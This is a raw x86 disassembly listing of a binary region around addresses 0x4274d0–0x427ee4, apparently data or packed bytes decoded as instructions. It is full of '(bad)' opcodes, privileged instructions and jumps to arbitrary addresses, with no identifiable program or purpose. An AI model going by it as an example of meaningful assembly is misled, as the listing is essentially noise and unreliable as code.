  4274d0:	dec    di
  4274d2:	push   edx
  4274d3:	mov    al,0x46
  4274d5:	int    0x34
  4274d7:	scas   eax,DWORD PTR es:[edi]
  4274d8:	enter  0x20e,0xf3
  4274dc:	out    dx,al
  4274dd:	mov    esi,0xb8db6e9f
  4274e2:	sti    
  4274e3:	and    DWORD PTR [ebx+ecx*1-0x5f],ecx
  4274e7:	mov    dh,al
  4274e9:	pop    eax
  4274ea:	push   cs
  4274eb:	ds aaa 
  4274ed:	and    BYTE PTR [edi+0x74],dh
  4274f0:	jnp    0x42747d
  4274f2:	enter  0xba58,0x8a
  4274f6:	jb     0x4274f7
  4274f8:	ins    BYTE PTR es:[edi],dx
  4274f9:	mov    bh,0xf9
  4274fb:	adc    cl,al
  4274fd:	lods   eax,DWORD PTR ds:[esi]
  4274fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274ff:	xchg   DWORD PTR [ecx+0x64884861],edx
  427505:	push   edi
  427506:	shr    BYTE PTR [ebx+0x7ec4ffd7],0xd9
  42750d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42750e:	adc    esp,DWORD PTR [edi-0x704376b4]
  427514:	lock mov bh,0xb7
  427517:	bound  ebx,QWORD PTR [eax-0x1e]
  42751a:	xchg   ebx,eax
  42751b:	pop    edx
  42751c:	lds    edi,FWORD PTR [eax+0x76]
  42751f:	ins    BYTE PTR es:[edi],dx
  427520:	mov    edx,0x5113e68b
  427525:	leave  
  427526:	push   0x4912fe0c
  42752b:	jp     0x427574
  42752d:	mov    BYTE PTR [edi+esi*4+0x6f],dl
  427531:	cmp    DWORD PTR [esi+0x42],0x70e3bd8e
  427538:	jp     0x427509
  42753a:	jbe    0x4274bd
  42753c:	pop    esp
  42753d:	scas   eax,DWORD PTR es:[edi]
  42753e:	jle    0x4274c1
  427540:	pushf  
  427541:	scas   eax,DWORD PTR es:[edi]
  427542:	cli    
  427543:	xchg   ebp,eax
  427544:	js     0x427578
  427546:	dec    esi
  427547:	cmp    eax,0x5ea3ddbb
  42754c:	mov    ebx,0x1df7e5e8
  427551:	and    eax,0x5d6d667f
  427556:	mov    bl,0xd9
  427558:	jle    0x4275b2
  42755a:	pop    edx
  42755b:	push   cs
  42755c:	mov    cl,0xcd
  42755e:	lock push ebx
  427560:	adc    eax,0x377af603
  427565:	adc    ch,BYTE PTR [ecx+ebp*2+0x4]
  427569:	test   eax,0x512070ca
	...
  4275d6:	pop    esp
  4275d7:	test   al,0xc0
  4275d9:	stos   DWORD PTR es:[edi],eax
  4275da:	hlt    
  4275db:	jmp    0x42765c
  4275dd:	(bad)  
  4275de:	cmp    dh,BYTE PTR [esi]
  4275e0:	jbe    0x42764c
  4275e2:	lods   al,BYTE PTR ds:[esi]
  4275e3:	das    
  4275e4:	int3   
  4275e5:	sbb    al,0x67
  4275e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275e8:	add    DWORD PTR [eax],eax
  4275ea:	add    BYTE PTR [ecx],al
  4275ec:	add    BYTE PTR [eax],al
  4275ee:	push   ecx
  4275ef:	xchg   ebp,eax
  4275f0:	xchg   edi,eax
  4275f1:	push   0xb2753697
  4275f6:	fld    TBYTE PTR ds:0x80ec547b
  4275fc:	push   0x946289ff
  427601:	xchg   ecx,eax
  427602:	cs pop edx
  427604:	mov    WORD PTR [ecx+0x2a1225de],?
  42760a:	fmul   DWORD PTR [eax-0x64]
  42760d:	ds jecxz 0x427689
  427610:	add    DWORD PTR [ecx+0x3f],edi
  427613:	pop    ds
  427614:	mov    WORD PTR [ebx-0x2b714c94],cs
  42761a:	xor    DWORD PTR [esp+edx*1+0x57],ebx
  42761e:	sti    
  42761f:	pop    edx
  427620:	mov    dh,0xc2
  427622:	jmp    0x42760c
  427624:	int3   
  427625:	sbb    bl,BYTE PTR [si-0x79df]
  42762a:	out    0x45,al
  42762c:	sub    BYTE PTR [eax+eiz*8],bl
  42762f:	lock mov WORD PTR [ebx],fs
  427632:	and    eax,0x11f334dc
  427637:	mov    BYTE PTR [edx],cl
  427639:	mov    edx,0x3f6bb550
  42763e:	mov    edx,DWORD PTR [edx]
  427640:	cmp    eax,0x45be498a
  427645:	add    BYTE PTR [ecx-0x4b],ch
  427648:	ins    BYTE PTR es:[edi],dx
  427649:	(bad)  
  42764a:	stos   BYTE PTR es:[edi],al
  42764b:	fsub   DWORD PTR [edx+0x47f21918]
  427651:	sub    esp,DWORD PTR [edi]
  427653:	mov    ah,0xdc
  427655:	dec    esi
  427656:	dec    esi
  427657:	adc    esp,DWORD PTR [ebp-0x5a]
  42765a:	data16 jo 0x4275fe
  42765d:	aas    
  42765e:	and    DWORD PTR [esi-0x3f374a2e],0xfffffff5
  427665:	sti    
  427666:	xlat   BYTE PTR ds:[ebx]
  427667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427668:	test   BYTE PTR [eax+0x2ca11d9d],dh
  42766e:	jmp    0x427642
  427670:	ds nop
  427672:	rcr    BYTE PTR [esi+0x72],cl
  427675:	add    edi,ecx
  427677:	mov    dh,0xcf
  427679:	fisub  DWORD PTR [eax-0x72]
  42767c:	jp     0x42760c
  42767e:	xchg   esi,eax
  42767f:	aam    0xcd
  427681:	dec    ecx
  427682:	enter  0x92c4,0x97
  427686:	cmp    BYTE PTR [edi+0x2a],bh
  427689:	cdq    
  42768a:	fistp  WORD PTR ds:0x262ab3f0
  427690:	lahf   
  427691:	xchg   BYTE PTR [esi],cl
  427693:	cmc    
  427694:	aas    
  427695:	xchg   edx,eax
  427696:	dec    ebp
  427697:	and    cl,BYTE PTR [edx]
  427699:	out    dx,al
  42769a:	dec    esp
  42769b:	and    al,0x5a
  42769d:	jg     0x4276a5
  42769f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4276a0:	mov    dh,0x42
  4276a2:	repnz push ss
  4276a4:	outs   dx,BYTE PTR ds:[esi]
  4276a5:	dec    esp
  4276a6:	js     0x427704
  4276a8:	shr    DWORD PTR [eax+0x3c537de6],0x3e
  4276af:	inc    ebx
  4276b0:	repz mov ebx,ds
  4276b3:	xlat   BYTE PTR ds:[ebx]
  4276b4:	jg     0x4276bf
  4276b6:	mov    esp,DWORD PTR [ebx+0x2b]
  4276b9:	test   eax,0x779058c8
  4276be:	outs   dx,BYTE PTR ds:[esi]
  4276bf:	les    esp,FWORD PTR [edi]
  4276c1:	push   ds
  4276c2:	jge    0x4276fe
  4276c4:	sub    ah,0xe6
  4276c7:	push   0xcba5d248
  4276cc:	fnstenv [edx-0x7b]
  4276cf:	pop    eax
  4276d0:	xchg   esi,eax
  4276d1:	das    
  4276d2:	jae    0x427659
  4276d4:	jl     0x4276ca
  4276d6:	rep ins BYTE PTR es:[edi],dx
  4276d8:	xor    eax,0xb86bf5d3
  4276dd:	outs   dx,BYTE PTR ds:[esi]
  4276de:	test   eax,0x57908509
  4276e3:	popa   
  4276e4:	hlt    
  4276e5:	push   cs
  4276e6:	xor    BYTE PTR [eax],al
  4276e8:	lea    esp,ss:[eax]
  4276eb:	shr    BYTE PTR [ecx+0x6f],1
	...
  427755:	add    BYTE PTR [ecx],al
  427757:	push   esi
  427758:	nop
  427759:	out    dx,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	out    dx,al
  42775c:	jg     0x42775d
  42775e:	in     al,dx
  42775f:	xor    al,0x86
  427761:	fst    DWORD PTR [ecx+0x6b]
  427764:	test   al,0x52
  427766:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  427768:	add    DWORD PTR [eax],eax
  42776a:	add    BYTE PTR [ecx],al
  42776c:	add    BYTE PTR [eax],al
  42776e:	pop    ebx
  42776f:	cmp    ebx,DWORD PTR [edx]
  427771:	xchg   ebx,eax
  427772:	loopne 0x4277cc
  427774:	and    DWORD PTR [ecx+0x43314ba6],ebx
  42777a:	sbb    bl,bh
  42777c:	cs pushf 
  42777e:	pusha  
  42777f:	jne    0x427731
  427781:	nop
  427782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427783:	add    eax,0x6c64b4b1
  427788:	sub    al,0xae
  42778a:	jp     0x427798
  42778c:	mov    ds:0xe338f2cc,al
  427791:	cdq    
  427792:	mov    ds:0x5b7b6ef1,eax
  427797:	test   BYTE PTR [ecx+edi*2+0x6d],0xb6
  42779c:	aam    0x45
  42779e:	jb     0x4277a3
  4277a0:	jmp    0x427767
  4277a2:	push   es
  4277a3:	dec    edx
  4277a4:	sahf   
  4277a5:	xor    DWORD PTR [esi-0x3],edx
  4277a8:	iret   
  4277a9:	imul   edi,ecx,0xb507ca41
  4277af:	(bad)  
  4277b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277b1:	inc    edx
  4277b2:	push   eax
  4277b3:	(bad)  
  4277b4:	push   0xa332110d
  4277b9:	xor    edi,DWORD PTR [edi-0x17cbc9ef]
  4277bf:	ins    BYTE PTR es:[edi],dx
  4277c0:	scas   eax,DWORD PTR es:[edi]
  4277c1:	and    eax,0xc1878380
  4277c6:	sti    
  4277c7:	shr    DWORD PTR [edx-0x49],1
  4277ca:	pushf  
  4277cb:	jbe    0x4277fc
  4277cd:	jbe    0x4277cb
  4277cf:	dec    DWORD PTR ds:0xfaa92d7f
  4277d5:	xchg   esp,eax
  4277d6:	xlat   BYTE PTR ds:[ebx]
  4277d7:	in     eax,dx
  4277d8:	adc    BYTE PTR [edi],cl
  4277da:	xchg   esp,eax
  4277db:	adc    DWORD PTR [esi+0x1df23815],esp
  4277e1:	jl     0x42780b
  4277e3:	jno    0x427863
  4277e5:	xchg   esi,eax
  4277e6:	jp     0x4277e4
  4277e8:	sub    eax,0x9cae54ef
  4277ed:	imul   ecx,DWORD PTR [esi*1+0x361b62df],0x29
  4277f5:	imul   eax,esi,0xffffff97
  4277f8:	inc    ecx
  4277f9:	cld    
  4277fa:	jno    0x427845
  4277fc:	xchg   ebx,eax
  4277fd:	lods   eax,DWORD PTR ds:[esi]
  4277fe:	test   DWORD PTR cs:[ebx+0x7d82311e],edx
  427805:	ins    BYTE PTR es:[edi],dx
  427806:	jb     0x427845
  427808:	inc    esp
  427809:	mov    ah,0x42
  42780b:	ins    DWORD PTR es:[edi],dx
  42780c:	(bad)  
  42780d:	xchg   edx,eax
  42780e:	sbb    al,0xed
  427810:	mov    ds:0xab955fbf,al
  427815:	fwait
  427816:	inc    eax
  427817:	jge    0x4277c5
  427819:	lods   eax,DWORD PTR ds:[esi]
  42781a:	pop    ebp
  42781b:	or     ebx,DWORD PTR [ecx+0x4077af08]
  427821:	mov    ebp,0xe9535b87
  427826:	adc    eax,0xbc3e7b5d
  42782b:	mov    ebp,0x1585b68f
  427830:	sti    
  427831:	pop    ecx
  427832:	repnz mov BYTE PTR [ecx-0x47],bh
  427836:	rcl    BYTE PTR [edx-0x62],cl
  427839:	xor    eax,0x3196e725
  42783e:	jns    0x4277f2
  427840:	sub    eax,0xbe2709a4
  427845:	lods   al,BYTE PTR ds:[esi]
  427846:	push   0xffffffb8
  427848:	sti    
  427849:	aam    0x5
  42784b:	mul    edx
  42784d:	push   edi
  42784e:	inc    eax
  42784f:	repz jp 0x4278bc
  427852:	xor    DWORD PTR [edx-0x2d0559b0],esi
  427858:	dec    esp
  427859:	xchg   ebx,eax
  42785a:	gs push 0xffffffaa
  42785d:	mov    ch,0xd1
  42785f:	or     esp,ebp
  427861:	adc    edi,DWORD PTR [edx+0x79f1f946]
  427867:	sub    al,0x97
  427869:	(bad)  
  42786a:	leave  
  42786b:	ja     0x4278ea
  42786d:	in     al,0x0
	...
  4278d3:	add    BYTE PTR [eax],al
  4278d5:	add    BYTE PTR [edx],bl
  4278d7:	mov    cl,BYTE PTR [ebx]
  4278d9:	inc    ebp
  4278da:	fwait
  4278db:	lds    ebx,FWORD PTR [esi-0x21]
  4278de:	jo     0x427945
  4278e0:	fldl2e 
  4278e2:	in     eax,dx
  4278e3:	enter  0x5163,0x67
  4278e7:	test   al,0x1
  4278e9:	add    BYTE PTR [eax],al
  4278eb:	add    DWORD PTR [eax],eax
  4278ed:	add    BYTE PTR [esp+esi*8],al
  4278f0:	sahf   
  4278f1:	xchg   BYTE PTR [ebp-0x7f261c75],cl
  4278f7:	and    eax,0x6679a015
  4278fc:	jne    0x427969
  4278fe:	cmp    eax,0x5a8ac17b
  427903:	jns    0x42792b
  427905:	inc    ecx
  427906:	repz jo 0x42793b
  427909:	inc    eax
  42790a:	inc    ebx
  42790b:	lds    eax,FWORD PTR [edx+edi*1+0x5d35fb54]
  427912:	dec    eax
  427913:	or     eax,0xd1d8263e
  427918:	sbb    dl,BYTE PTR [eax]
  42791a:	xor    eax,0x29828ff
  42791f:	lods   eax,DWORD PTR ds:[esi]
  427920:	cwde   
  427921:	lahf   
  427922:	jle    0x427927
  427924:	imul   eax,DWORD PTR [edx+0x3e39d42e],0xffffffe1
  42792b:	imul   DWORD PTR [esi+ecx*4-0x6132dc91]
  427932:	xlat   BYTE PTR ds:[ebx]
  427933:	retf   
  427934:	mov    dh,0xc
  427936:	mov    esi,0x131cc1d9
  42793b:	fistp  DWORD PTR [eax]
  42793d:	ds dec esi
  42793f:	mov    al,0x27
  427941:	scas   eax,DWORD PTR es:[edi]
  427942:	fcom   DWORD PTR [bp+0x5b]
  427946:	add    ebx,DWORD PTR [edi+0x28]
  427949:	pop    edi
  42794a:	fcmovnu st,st(6)
  42794c:	jl     0x4279c8
  42794e:	mov    al,ds:0xff220c31
  427953:	sub    DWORD PTR ds:0xfe84fe95,eax
  427959:	xor    bl,0xf9
  42795c:	test   eax,0x3d233506
  427961:	sahf   
  427962:	repz xchg edi,ebp
  427965:	pop    ecx
  427966:	sub    ebp,edx
  427968:	mov    edi,DWORD PTR [edx+0x71]
  42796b:	int3   
  42796c:	loop   0x427916
  42796e:	cmp    ah,BYTE PTR [ecx+0x25]
  427971:	cli    
  427972:	cmp    ch,BYTE PTR [edi-0x64266f07]
  427978:	pop    esp
  427979:	xor    ch,bh
  42797b:	bound  eax,QWORD PTR [ecx-0x532a5f7]
  427981:	pushf  
  427982:	inc    ebx
  427983:	sbb    ah,dh
  427985:	xlat   BYTE PTR ds:[ebx]
  427986:	mov    DWORD PTR [ebx-0x53cdbcd5],ecx
  42798c:	jmp    0x9fed1fe8
  427991:	and    eax,0x70d2396
  427996:	cdq    
  427997:	aaa    
  427998:	cmp    eax,0x581331f7
  42799d:	sub    dh,dl
  42799f:	aad    0x73
  4279a1:	neg    DWORD PTR [esi+0x61]
  4279a4:	push   edi
  4279a5:	dec    esi
  4279a6:	sahf   
  4279a7:	sub    BYTE PTR [ebx+0x40767eb7],bl
  4279ad:	scas   al,BYTE PTR es:[edi]
  4279ae:	clc    
  4279af:	add    bh,BYTE PTR [edx]
  4279b1:	out    0x97,eax
  4279b3:	sub    DWORD PTR [ebx],ebp
  4279b5:	repnz out dx,al
  4279b7:	es int 0x51
  4279ba:	cmp    dh,BYTE PTR ds:0xe523a403
  4279c0:	mov    ds:0xac404eb9,eax
  4279c5:	inc    edx
  4279c6:	xchg   esp,eax
  4279c7:	adc    DWORD PTR [edx+0x6c3ae5a2],edx
  4279cd:	clc    
  4279ce:	mov    ecx,0x2ea2fa3f
  4279d3:	ret    
  4279d4:	push   0xffffffbd
  4279d6:	rcl    DWORD PTR [esi-0x46a1731f],1
  4279dc:	pop    ds
  4279dd:	add    eax,0x14fa74f9
  4279e2:	lods   al,BYTE PTR ds:[esi]
  4279e3:	fiadd  DWORD PTR [ebx]
  4279e5:	xchg   cl,ah
  4279e7:	fstp   st(7)
  4279e9:	jl     0x427978
  4279eb:	int3   
  4279ec:	xor    esp,edi
	...
  427a56:	call   0xdea3:0xffa3ffdd
  427a5d:	std    
  427a5e:	inc    edx
  427a5f:	jne    0x427a39
  427a61:	sub    DWORD PTR [ecx+0x674dd9fa],0xffffffa9
  427a68:	add    DWORD PTR [eax],eax
  427a6a:	add    BYTE PTR [ecx],al
  427a6c:	add    BYTE PTR [eax],al
  427a6e:	or     al,0xb2
  427a70:	xor    eax,0x2f9be743
  427a75:	add    al,0x49
  427a77:	outs   dx,DWORD PTR ds:[esi]
  427a78:	xchg   edi,eax
  427a79:	call   0xf0c3323d
  427a7e:	dec    edx
  427a7f:	lock cdq 
  427a81:	icebp  
  427a82:	sbb    esp,edx
  427a84:	and    al,0x8e
  427a86:	repnz inc esp
  427a88:	adc    al,0xca
  427a8a:	cli    
  427a8b:	test   eax,0x82476153
  427a90:	jmp    0xb24:0x11e3b185
  427a97:	outs   dx,BYTE PTR ds:[esi]
  427a98:	cmp    DWORD PTR [ecx],edx
  427a9a:	push   0x45709642
  427a9f:	xchg   edi,eax
  427aa0:	nop
  427aa1:	stc    
  427aa2:	imul   eax,DWORD PTR [edi],0x4
  427aa5:	dec    ecx
  427aa6:	(bad)  
  427aa7:	sub    al,0x7
  427aa9:	pop    edx
  427aaa:	cdq    
  427aab:	test   DWORD PTR [edi],esp
  427aad:	jno    0x427a7c
  427aaf:	in     eax,0x1d
  427ab1:	lahf   
  427ab2:	out    dx,al
  427ab3:	mov    WORD PTR [ecx+edi*2],gs
  427ab6:	jb     0x427a6e
  427ab8:	sbb    esp,DWORD PTR [edi+ebp*1-0x635c0d07]
  427abf:	adc    bl,BYTE PTR [ebx]
  427ac1:	fisttp DWORD PTR [esi+0x5f]
  427ac4:	dec    edi
  427ac5:	pop    ebp
  427ac6:	mov    ecx,0xd7a505a1
  427acb:	mov    ecx,ds
  427acd:	xor    edi,ecx
  427acf:	jecxz  0x427ae3
  427ad1:	inc    ebx
  427ad2:	neg    edx
  427ad4:	call   0x6263:0x5405e8ea
  427adb:	test   esi,ebp
  427add:	daa    
  427ade:	pop    esi
  427adf:	idiv   DWORD PTR [ebx-0x16f114c1]
  427ae5:	addr16 cli 
  427ae7:	pusha  
  427ae8:	mov    eax,0x6b90f3
  427aed:	mov    bh,0xb7
  427aef:	cdq    
  427af0:	xor    eax,0x3ceb4e87
  427af5:	xor    ebp,DWORD PTR [edx+ebx*4-0x4402ae71]
  427afc:	xchg   ecx,edi
  427afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427aff:	adc    BYTE PTR [esi+eax*8+0x75cab1db],cl
  427b06:	ficomp DWORD PTR [edi+0x26]
  427b09:	pusha  
  427b0a:	inc    eax
  427b0b:	enter  0xe6b5,0xd0
  427b0f:	xor    DWORD PTR [edi-0x4c685a5a],0x1163ee3
  427b19:	scas   eax,DWORD PTR es:[edi]
  427b1a:	push   ebp
  427b1b:	mov    al,0x8c
  427b1d:	dec    ebp
  427b1e:	xlat   BYTE PTR ds:[ebx]
  427b1f:	scas   eax,DWORD PTR es:[edi]
  427b20:	lock test eax,0x66f0dc85
  427b26:	jns    0x427ad1
  427b28:	mov    esi,ebx
  427b2a:	idiv   DWORD PTR [ebx]
  427b2c:	jno    0x427b69
  427b2e:	ins    BYTE PTR es:[edi],dx
  427b2f:	aad    0xe9
  427b31:	push   ss
  427b32:	popa   
  427b33:	mov    al,0xe6
  427b35:	cmp    al,0xdb
  427b37:	xchg   esp,eax
  427b38:	in     al,dx
  427b39:	push   ecx
  427b3a:	cmp    esi,DWORD PTR [eax]
  427b3c:	in     al,dx
  427b3d:	dec    ebx
  427b3e:	rcr    BYTE PTR [ecx+0x5f],cl
  427b41:	fidiv  DWORD PTR [ebp+ecx*1-0x2e]
  427b45:	mov    cl,0x5c
  427b47:	sbb    ah,ah
  427b49:	popf   
  427b4a:	jb     0x427b0c
  427b4c:	je     0x427ba4
  427b4e:	lds    esi,FWORD PTR [esi+0x67174f4a]
  427b54:	xchg   esi,eax
  427b55:	push   esp
  427b56:	xor    al,0x13
  427b58:	dec    edi
  427b59:	outs   dx,DWORD PTR ds:[esi]
  427b5a:	lock add eax,0x93ab315b
  427b60:	inc    edx
  427b61:	rol    edi,cl
  427b63:	icebp  
  427b64:	inc    edx
  427b65:	sahf   
  427b66:	add    al,0x9e
  427b68:	test   dl,dh
  427b6a:	push   edx
  427b6b:	sbb    BYTE PTR [esi+0x47],0x0
	...
  427bd6:	retf   0x528b
  427bd9:	jnp    0x427c2e
  427bdb:	sti    
  427bdc:	jmp    0x427b99
  427bde:	push   ecx
  427bdf:	mov    ecx,ebx
  427be1:	test   BYTE PTR [ebx],0x83
  427be4:	hlt    
  427be5:	mov    al,ds:0x1aa67
  427bea:	add    BYTE PTR [ecx],al
  427bec:	add    BYTE PTR [eax],al
  427bee:	cli    
  427bef:	or     BYTE PTR [esi],cl
  427bf1:	test   DWORD PTR [ecx],0xd640e518
  427bf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427bf8:	pop    edi
  427bf9:	sbb    eax,eax
  427bfb:	inc    ebx
  427bfc:	fistp  QWORD PTR [ecx]
  427bfe:	adc    ecx,DWORD PTR [edi-0x64]
  427c01:	push   0xffffff8b
  427c03:	ins    BYTE PTR es:[edi],dx
  427c04:	cli    
  427c05:	dec    ebx
  427c06:	jp     0x427b9d
  427c08:	push   ss
  427c09:	and    al,0xf9
  427c0b:	cmp    al,BYTE PTR [ebx+0x6b406620]
  427c11:	bound  edx,QWORD PTR [eax]
  427c13:	or     al,0x2
  427c15:	ds inc eax
  427c17:	adc    BYTE PTR [edi-0x74],dl
  427c1a:	pop    ebx
  427c1b:	das    
  427c1c:	call   0x28e3:0x9a42da50
  427c23:	pop    ds
  427c24:	loopne 0x427bf7
  427c26:	stos   BYTE PTR es:[edi],al
  427c27:	mov    cl,0x67
  427c29:	fwait
  427c2a:	mov    ebx,0xc9ffef65
  427c2f:	push   esp
  427c30:	jne    0x427c44
  427c32:	scas   eax,DWORD PTR es:[edi]
  427c33:	dec    ebx
  427c34:	mov    esp,0xfca00efe
  427c39:	es inc esp
  427c3b:	sub    BYTE PTR [edx+0x6160176f],dh
  427c41:	jle    0x427bf9
  427c43:	add    edi,ebx
  427c45:	pop    ebp
  427c46:	pop    ecx
  427c47:	and    BYTE PTR [esi-0x62a344af],bl
  427c4d:	cdq    
  427c4e:	cmp    dl,bh
  427c50:	and    cl,BYTE PTR [edi+0x25]
  427c53:	ror    DWORD PTR [edx+eax*2],cl
  427c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c57:	jg     0x427c89
  427c59:	loopne 0x427c36
  427c5b:	clc    
  427c5c:	fcomp  st(3)
  427c5e:	sub    BYTE PTR [ecx+0x71],dh
  427c61:	dec    ebx
  427c62:	arpl   WORD PTR ds:0xf0c13bdc,sp
  427c68:	xor    ebp,DWORD PTR ss:[ebx]
  427c6b:	int3   
  427c6c:	xchg   ebp,eax
  427c6d:	aas    
  427c6e:	in     eax,dx
  427c6f:	je     0x427cc9
  427c71:	jb     0x427c06
  427c73:	cdq    
  427c74:	lods   eax,DWORD PTR ds:[esi]
  427c75:	add    al,0x55
  427c77:	fstp   QWORD PTR [ebx+ecx*1]
  427c7a:	std    
  427c7b:	push   esi
  427c7c:	(bad)  
  427c7d:	cmp    BYTE PTR [ebx],ch
  427c7f:	mov    edi,0xdfc2b2f6
  427c84:	(bad)  
  427c85:	stos   DWORD PTR es:[edi],eax
  427c86:	aas    
  427c87:	adc    DWORD PTR [edx-0x4ddf7619],edi
  427c8d:	retf   0x2af8
  427c90:	xchg   bh,bh
  427c92:	ja     0x427c75
  427c94:	jo     0x427ca8
  427c96:	mov    ds:0xbff848c2,eax
  427c9b:	adc    esi,DWORD PTR [edx-0x23]
  427c9e:	outs   dx,BYTE PTR ds:[esi]
  427c9f:	pop    ss
  427ca0:	add    al,0xd6
  427ca2:	mov    esi,0xa01bee4e
  427ca7:	(bad)  
  427ca8:	jno    0x427cbd
  427caa:	int3   
  427cab:	jo     0x427c69
  427cad:	stos   DWORD PTR es:[edi],eax
  427cae:	rol    eax,1
  427cb0:	add    edi,DWORD PTR [esi]
  427cb2:	es inc edi
  427cb4:	sbb    BYTE PTR [eax+0x4c],bl
  427cb7:	push   DWORD PTR es:[ecx-0x3d1d028f]
  427cbe:	pop    ebp
  427cbf:	aam    0xd1
  427cc1:	xor    dl,BYTE PTR [edi]
  427cc3:	adc    bh,dl
  427cc5:	pop    eax
  427cc6:	pop    edi
  427cc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427cc8:	fucomip st,st(7)
  427cca:	nop
  427ccb:	or     BYTE PTR [edi],cl
  427ccd:	xor    BYTE PTR [ebx-0x5],cl
  427cd0:	pushf  
  427cd1:	inc    edi
  427cd2:	add    DWORD PTR [eax],0x8daf7a5f
  427cd8:	cmc    
  427cd9:	xor    eax,0xea385931
  427cde:	xor    bh,BYTE PTR [edx-0x37]
  427ce1:	in     al,dx
  427ce2:	out    0x91,eax
  427ce4:	mov    al,0x9a
  427ce6:	pop    edi
  427ce7:	js     0x427cbb
  427ce9:	jge    0x427c99
  427ceb:	pop    esp
  427cec:	xchg   esp,eax
  427ced:	pop    ebp
	...
  427d56:	mov    ds:0xf343b050,eax
  427d5b:	jecxz  0x427d50
  427d5d:	lock xchg DWORD PTR ds:0x88295d44,ebx
  427d64:	mov    edi,0x1ab67f8
  427d69:	add    BYTE PTR [eax],al
  427d6b:	add    DWORD PTR [eax],eax
  427d6d:	add    dh,dl
  427d6f:	pop    ss
  427d70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d71:	jno    0x427d21
  427d73:	sbb    eax,0x7ed89d33
  427d78:	push   ecx
  427d79:	and    BYTE PTR [ebp+ecx*8-0x48],ah
  427d7d:	cmp    bh,al
  427d7f:	std    
  427d80:	cmp    ah,BYTE PTR [edx]
  427d82:	pop    ebx
  427d83:	dec    edi
  427d84:	mov    ds:0xebae158b,eax
  427d89:	xchg   esi,eax
  427d8a:	inc    edi
  427d8b:	in     eax,dx
  427d8c:	dec    edi
  427d8d:	fist   WORD PTR [ecx]
  427d8f:	xchg   ebx,eax
  427d90:	xor    cl,BYTE PTR [eax+0x1c86ab44]
  427d96:	add    edi,DWORD PTR [ecx-0x59]
  427d99:	mov    ah,0xfb
  427d9b:	pop    es
  427d9c:	push   esi
  427d9d:	dec    edi
  427d9e:	add    al,0x28
  427da0:	jecxz  0x427d6b
  427da2:	and    eax,0xdd624666
  427da7:	das    
  427da8:	push   eax
  427da9:	sub    bl,ch
  427dab:	daa    
  427dac:	jae    0x427e22
  427dae:	push   edx
  427daf:	xor    bl,al
  427db1:	fwait
  427db2:	mov    esi,DWORD PTR [ebx+0x60]
  427db5:	xchg   edi,eax
  427db6:	pop    edx
  427db7:	or     edx,DWORD PTR [edi+0x3296ffd2]
  427dbd:	adc    edi,edi
  427dbf:	mov    bh,0x1
  427dc1:	in     eax,dx
  427dc2:	sbb    dh,BYTE PTR [edx+0x1c795ada]
  427dc8:	jnp    0x427d83
  427dca:	pop    ds
  427dcb:	sub    DWORD PTR [esi+edx*8-0x13c062c],esp
  427dd2:	lds    ecx,FWORD PTR [eax]
  427dd4:	ja     0x427de2
  427dd6:	dec    ebp
  427dd7:	ins    DWORD PTR es:[edi],dx
  427dd8:	outs   dx,BYTE PTR ds:[esi]
  427dd9:	adc    DWORD PTR [esi+0x41dee1f1],edx
  427ddf:	inc    ecx
  427de0:	scas   eax,DWORD PTR es:[edi]
  427de1:	jl     0x427dbd
  427de3:	int3   
  427de4:	(bad)  
  427de5:	fsub   QWORD PTR [esi+0x20]
  427de8:	jmp    FWORD PTR ds:0x3615bed3
  427dee:	push   ebx
  427def:	sahf   
  427df0:	pop    esp
  427df1:	inc    edx
  427df2:	addr16 fucomi st,st(6)
  427df5:	xor    eax,DWORD PTR [eax-0x1]
  427df8:	je     0x427e17
  427dfa:	jg     0x427e17
  427dfc:	or     esp,esp
  427dfe:	loopne 0x427e4a
  427e00:	retf   0x7500
  427e03:	loop   0x427de7
  427e05:	iret   
  427e06:	ds ret 
  427e08:	ret    
  427e09:	(bad)  
  427e0b:	jge    0x427dca
  427e0d:	pusha  
  427e0e:	das    
  427e0f:	push   0x36
  427e11:	push   ebx
  427e12:	dec    ebp
  427e13:	xor    al,0xa9
  427e15:	fild   QWORD PTR [edi-0x6f]
  427e18:	fidiv  WORD PTR [esi+0x7c3e9f82]
  427e1e:	sbb    DWORD PTR gs:[edi],eax
  427e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e22:	(bad)  
  427e23:	out    0xbb,eax
  427e25:	sbb    edx,DWORD PTR [ebx+0x325f12d]
  427e2b:	arpl   WORD PTR [ebp+esi*4+0x16],cx
  427e2f:	pusha  
  427e30:	sbb    al,0xd2
  427e32:	push   cs
  427e33:	sub    ecx,DWORD PTR [edi+0x15]
  427e36:	dec    ebx
  427e37:	out    0xba,al
  427e39:	add    ch,ah
  427e3b:	xchg   esp,eax
  427e3c:	(bad)  
  427e3d:	popf   
  427e3e:	cmp    al,0x94
  427e40:	xor    BYTE PTR [eax],al
  427e42:	mov    eax,ds:0x288e7dd6
  427e47:	loope  0x427de1
  427e49:	mov    BYTE PTR [ecx],al
  427e4b:	mov    edi,0x3f44b1b4
  427e50:	adc    esi,DWORD PTR [eax-0x3f5e1e3e]
  427e56:	sbb    eax,0x8f3b90da
  427e5b:	cmp    bh,0x21
  427e5e:	cmp    dh,dl
  427e60:	je     0x427e0c
  427e62:	adc    dh,dh
  427e64:	cmc    
  427e65:	add    al,0xe9
  427e67:	inc    ebx
  427e68:	outs   dx,BYTE PTR ds:[esi]
  427e69:	xchg   esi,eax
  427e6a:	(bad)  
  427e6b:	sbb    eax,0x8370
	...
  427ed4:	add    BYTE PTR [eax],al
  427ed6:	mov    eax,0x6d3c25f1
  427edb:	cld    
  427edc:	mov    ecx,0x2bc293f5
  427ee1:	leave  
  427ee2:	(bad)  [edi]
  427ee4:	je     0x427f3b
